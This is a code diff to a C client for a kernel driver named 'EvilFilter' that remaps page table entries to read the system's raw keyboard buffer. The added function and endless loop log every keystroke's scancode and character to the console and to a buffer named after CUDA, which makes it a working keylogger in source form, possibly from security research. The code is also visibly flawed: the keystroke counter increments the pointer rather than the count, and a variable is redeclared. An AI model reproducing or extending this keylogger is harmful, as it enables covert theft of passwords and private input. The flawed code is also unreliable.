@@ -7,6 +7,31 @@
 #include <ntsecapi.h>
 #include <scancode.h>
 
+void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex) { // , PCHAR KeyMap
+		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0
+
+			if (*keystrokeIndex < 9998) {
+				cudaBuffer[*keystrokeIndex++] = KeyMap[keyboardData->MakeCode];
+			}
+			printf("KEY: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]\n",
+				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
+				keyboardData->MakeCode,
+				KeyMap[keyboardData->MakeCode],
+				keyboardData->UnitId,
+				keyboardData->Flags,
+				keyboardData->Reserved,
+				keyboardData->ExtraInformation);
+
+			*lastMake = keyboardData->MakeCode;
+			*lastModifier = keyboardData->Flags;
+
+		}
+}
+
+
+
+
+
 int main(int argc, _TCHAR* argv[]) {
 	#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
 	HANDLE hControlDevice;
@@ -75,24 +100,24 @@ int main(int argc, _TCHAR* argv[]) {
 			dataToTransmit->ClientMemory = keyboardData;
 			dataToTransmit->instruction = 'E';
 
-			pauseForABit(10);
 			printf("\nTransmitting\n");
-			pauseForABit(5);
 			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
 				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
 			}
 			else {
 				printf("Ioctl to EvilFilter device succeeded \n");
 				printf(" we now have the real keyboard buffer!!!\n");
-				dataToTransmit->instruction = 'Q';
 
-				printf("\nDouble checking with the driver that the address is correct\n");
-				pauseForABit(5);
-				if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, &DeviceIoOverlapped)) {
-					printf("Ioctl to EvilFilter device failed - unable to query driver\n");
-				}
-				else {
-					printf("\nverified....examine KMDF log\n");
+				PSHARED_MEMORY_STRUCT dataToTransmit;
+
+				USHORT lastMake = 666;
+				USHORT lastModifier = 666;
+				ULONG keystrokeIndex = 0;
+				PCHAR charBuffer = (PCHAR)malloc(sizeof(CHAR) * 10000);
+
+
+				while (TRUE) {
+					logKeyboardData(keyboardData, KeyMap, charBuffer, &lastMake, &lastModifier, &keystrokeIndex);
 				}
 			}
 		}
